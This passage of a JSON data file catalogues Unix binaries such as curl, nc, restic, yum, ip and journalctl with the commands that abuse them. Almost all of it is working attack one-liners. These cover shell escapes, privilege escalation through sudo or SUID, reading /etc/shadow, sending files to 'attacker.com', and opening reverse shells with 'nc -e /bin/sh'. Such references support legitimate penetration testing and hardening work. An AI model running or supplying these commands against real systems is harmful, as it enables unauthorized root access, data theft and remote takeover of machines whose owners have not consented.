    "functions": {
      "sudo": [
        {
          "code": "sudo systemd-resolve --status\n!sh\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "wall": {
    "description": "The textual file is dumped on the current TTY (neither to `stdout` nor to `stderr`).",
    "functions": {
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo wall --nobanner \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "ionice": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "ionice /bin/sh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "suid": [
        {
          "code": "./ionice /bin/sh -p",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo ionice /bin/sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "gcore": {
    "description": "It can be used to generate core dumps of running processes. Such files often contains sensitive information such as open files content, cryptographic keys, passwords, etc. This command produces a binary file named `core.$PID`, that is then often filtered with `strings` to narrow down relevant information.",
    "functions": {
      "file-read": [
        {
          "code": "gcore $PID",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "sudo gcore $PID",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "suid": [
        {
          "code": "./gcore $PID",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "curl": {
    "description": "",
    "functions": {
      "file-upload": [
        {
          "code": "URL=http://attacker.com/\nLFILE=file_to_send\ncurl -X POST -d \"@$LFILE\" $URL\n",
          "description": "It can exfiltrate files on the network."
        }
      ],
      "file-download": [
        {
          "code": "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\ncurl $URL -o $LFILE\n",
          "description": "It can download remote files."
        }
      ],
      "file-read": [
        {
          "code": "LFILE=/tmp/file_to_read\ncurl file://$LFILE\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "file-write": [
        {
          "code": "LFILE=file_to_write\nTF=$(mktemp)\necho DATA >$TF\ncurl \"file://$TF\" -o \"$LFILE\"\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./curl $URL -o $LFILE\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo curl $URL -o $LFILE\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "dosbox": {
    "description": "Basically `dosbox` allows to mount the local file system, so that it can be altered using DOS commands. Note that the DOS filename convention ([8.3](https://en.wikipedia.org/wiki/8.3_filename)) is used.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE='\\path\\to\\file_to_read'\ndosbox -c 'mount c /' -c \"type c:$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        },
        {
          "code": "LFILE='\\path\\to\\file_to_read'\ndosbox -c 'mount c /' -c \"copy c:$LFILE c:\\tmp\\output\" -c exit\ncat '/tmp/OUTPUT'\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "file-write": [
        {
          "code": "LFILE='\\path\\to\\file_to_write'\ndosbox -c 'mount c /' -c \"echo DATA >c:$LFILE\" -c exit\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE='\\path\\to\\file_to_write'\n./dosbox -c 'mount c /' -c \"echo DATA >c:$LFILE\" -c exit\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE='\\path\\to\\file_to_write'\nsudo dosbox -c 'mount c /' -c \"echo DATA >c:$LFILE\" -c exit\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "tac": {
    "description": "Make sure that `RANDOM` does not appear into the file to read otherwise the content of the file is corrupted by reversing the order of `RANDOM`-separated chunks.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\ntac -s 'RANDOM' \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./tac -s 'RANDOM' \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo tac -s 'RANDOM' \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "msgattrib": {
    "description": "The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nmsgattrib -P $LFILE\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo msgattrib -P $LFILE\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./msgattrib -P $LFILE\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "nc": {
    "description": "",
    "functions": {
      "reverse-shell": [
        {
          "code": "RHOST=attacker.com\nRPORT=12345\nnc -e /bin/sh $RHOST $RPORT\n",
          "description": "It can send back a reverse shell to a listening attacker to open a remote network access."
        }
      ],
      "bind-shell": [
        {
          "code": "LPORT=12345\nnc -l -p $LPORT -e /bin/sh\n",
          "description": "It can bind a shell to a local port to allow remote network access."
        }
      ],
      "file-upload": [
        {
          "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nnc $RHOST $RPORT < \"$LFILE\"\n",
          "description": "It can exfiltrate files on the network."
        }
      ],
      "file-download": [
        {
          "code": "LPORT=12345\nLFILE=file_to_save\nnc -l -p $LPORT > \"$LFILE\"\n",
          "description": "It can download remote files."
        }
      ],
      "sudo": [
        {
          "code": "RHOST=attacker.com\nRPORT=12345\nsudo nc -e /bin/sh $RHOST $RPORT\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "limited-suid": [
        {
          "code": "RHOST=attacker.com\nRPORT=12345\n./nc -e /bin/sh $RHOST $RPORT\n",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "aws": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "aws help\n!/bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo aws help\n!/bin/sh\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "journalctl": {
    "description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.\n\nThis might not work if run by unprivileged users depending on the system configuration.\n",
    "functions": {
      "shell": [
        {
          "code": "journalctl\n!/bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo journalctl\n!/bin/sh\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "dc": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "dc -e '!/bin/sh'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo dc -e '!/bin/sh'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "limited-suid": [
        {
          "code": "./dc -e '!/bin/sh'",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "snap": {
    "description": "",
    "functions": {
      "sudo": [
        {
          "code": "sudo snap install xxxx_1.0_all.snap --dangerous --devmode\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "bconsole": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "bconsole\n@exec /bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo bconsole\n@exec /bin/sh\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "file-read": [
        {
          "code": "bconsole -c /etc/shadow",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ]
    }
  },
  "ar": {
    "description": "The file appears amid the binary content of the archive.",
    "functions": {
      "file-read": [
        {
          "code": "TF=$(mktemp -u)\nLFILE=file_to_read\nar r \"$TF\" \"$LFILE\"\ncat \"$TF\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "TF=$(mktemp -u)\nLFILE=file_to_read\n./ar r \"$TF\" \"$LFILE\"\ncat \"$TF\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "TF=$(mktemp -u)\nLFILE=file_to_read\nsudo ar r \"$TF\" \"$LFILE\"\ncat \"$TF\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "restic": {
    "description": "The attacker must setup a server to receive the backups, in the following example [rest-server](https://github.com/restic/rest-server/) is used but there are other options. To start a new instance and create a new repository:\n\n```console\nRPORT=12345\nNAME=backup_name\n./rest-server --listen \":$RPORT\"\nrestic init -r \"rest:http://localhost:$RPORT/$NAME\"\n```\n\nTo extract the data from the restic repository in the current directory on the attacker side:\n\n```console\nrestic restore -r \"/tmp/restic/$NAME\" latest --target .\n```\n\nUpload data to the attacker server with the following commands.\n",
    "functions": {
      "file-upload": [
        {
          "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\nrestic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\"\n",
          "description": "It can exfiltrate files on the network."
        }
      ],
      "sudo": [
        {
          "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\nsudo restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "suid": [
        {
          "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\n./restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "cancel": {
    "description": "",
    "functions": {
      "file-upload": [
        {
          "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\ncancel -u \"$(cat $LFILE)\" -h $RHOST:$RPORT\n",
          "description": "It can exfiltrate files on the network."
        }
      ]
    }
  },
  "latexmk": {
    "description": "This allows to execute [`perl`](/gtfobins/perl/) code.",
    "functions": {
      "shell": [
        {
          "code": "latexmk -e 'exec \"/bin/sh\";'\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "latexmk -latex='/bin/sh #' /dev/null\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "file-read": [
        {
          "code": "latexmk -e 'open(X,\"/etc/passwd\");while(<X>){print $_;}exit'\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        },
        {
          "code": "TF=$(mktemp)\necho '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}' >$TF\nstrings tmp.dvi\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "sudo latexmk -e 'exec \"/bin/sh\";'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "ptx": {
    "description": "While the program is capable of reading the file, it outputs a \"permuted index\" of its content, thus altering it. Adjusting the options could yield more readable outputs.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nptx -w 5000 \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./ptx -w 5000 \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo ptx -w 5000 \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "cat": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\ncat \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./cat \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo cat \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "debugfs": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "debugfs\n!/bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "suid": [
        {
          "code": "./debugfs\n!/bin/sh\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo debugfs\n!/bin/sh\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "elvish": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "export LFILE=file_to_read\nelvish -c 'echo (slurp <$E:LFILE)'\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "file-write": [
        {
          "code": "export LFILE=file_to_write\nelvish -c 'echo DATA >$E:LFILE'\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "shell": [
        {
          "code": "elvish",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "suid": [
        {
          "code": "./elvish",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo elvish",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "multitime": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "multitime /bin/sh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "suid": [
        {
          "code": "./multitime /bin/sh -p",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo multitime /bin/sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "psftp": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "psftp\n!/bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "limited-suid": [
        {
          "code": "sudo psftp\n!/bin/sh\n",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo psftp\n!/bin/sh\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "date": {
    "description": "Each line is corrupted by a prefix string and wrapped inside quotes, so this may not be suitable for binary files.\n\nThis only works for the GNU variant of `date`.\n",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\ndate -f $LFILE\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./date -f $LFILE\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo date -f $LFILE\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "nice": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "nice /bin/sh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "suid": [
        {
          "code": "./nice /bin/sh -p",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo nice /bin/sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "ltrace": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nltrace -F $LFILE /dev/null\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "file-write": [
        {
          "code": "LFILE=file_to_write\nltrace -s 999 -o $LFILE ltrace -F DATA\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "shell": [
        {
          "code": "ltrace -b -L /bin/sh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo ltrace -b -L /bin/sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "pg": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "pg /etc/profile\n!/bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "file-read": [
        {
          "code": "pg file_to_read",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "sudo pg /etc/profile\n!/bin/sh\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "suid": [
        {
          "code": "./pg file_to_read",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "apache2ctl": {
    "description": "This includes the file in the actual configuration file, the first line is leaked as an error message.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\napache2ctl -c \"Include $LFILE\" -k stop\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo apache2ctl -c \"Include $LFILE\" -k stop\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "rev": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nrev $LFILE | rev\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./rev $LFILE | rev\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo rev $LFILE | rev\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "yum": {
    "description": "",
    "functions": {
      "file-download": [
        {
          "code": "RHOST=attacker.com\nRFILE=file_to_get.rpm\nyum install http://$RHOST/$RFILE\n",
          "description": "It can download remote files."
        }
      ],
      "sudo": [
        {
          "code": "sudo yum localinstall -y x-1.0-1.noarch.rpm\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        },
        {
          "code": "TF=$(mktemp -d)\ncat >$TF/x<<EOF\n[main]\nplugins=1\npluginpath=$TF\npluginconfpath=$TF\nEOF\n\ncat >$TF/y.conf<<EOF\n[main]\nenabled=1\nEOF\n\ncat >$TF/y.py<<EOF\nimport os\nimport yum\nfrom yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE\nrequires_api_version='2.1'\ndef init_hook(conduit):\n  os.execl('/bin/sh','/bin/sh')\nEOF\n\nsudo yum -c $TF/x --enableplugin=y\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "ip": {
    "description": "The read file content is corrupted by error prints.\n",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nip -force -batch \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./ip -force -batch \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        },
        {
          "code": "./ip netns add foo\n./ip netns exec foo /bin/sh -p\n./ip netns delete foo\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo ip -force -batch \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        },
        {
          "code": "sudo ip netns add foo\nsudo ip netns exec foo /bin/sh\nsudo ip netns delete foo\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        },
        {
